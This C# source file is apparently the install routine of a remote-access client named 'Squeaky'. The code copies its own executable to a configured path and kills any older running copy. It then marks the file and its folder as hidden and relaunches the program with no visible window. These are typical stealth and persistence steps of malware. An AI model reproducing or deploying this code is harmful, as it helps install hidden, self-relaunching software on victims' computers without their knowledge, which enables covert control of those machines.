using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Reflection;

namespace Squeaky.Client
{
    static class Setup
    {
        private static string CurrentLocation = Assembly.GetExecutingAssembly().Location;

        private static void Install()
        {
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLATION))) Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLATION));

            if (File.Exists(Settings.INSTALLATION))
            {
                try
                {
                    File.Delete(Settings.INSTALLATION);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        Process[] foundProcesses = Process.GetProcessesByName(Settings.INSTALLNAME);
                        int myPid = Process.GetCurrentProcess().Id;

                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;

                            if (prc.MainModule.FileName != Settings.INSTALLATION) continue;

                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }

                        File.Delete(Settings.INSTALLATION);
                    }
                }
            }

            File.Copy(CurrentLocation, Settings.INSTALLATION);
            File.SetAttributes(Settings.INSTALLATION, FileAttributes.Hidden);

            if (! string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
                di.Attributes |= FileAttributes.Hidden;
            }

            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = Settings.INSTALLATION
            };
            Process.Start(startInfo);
        }
    }
}
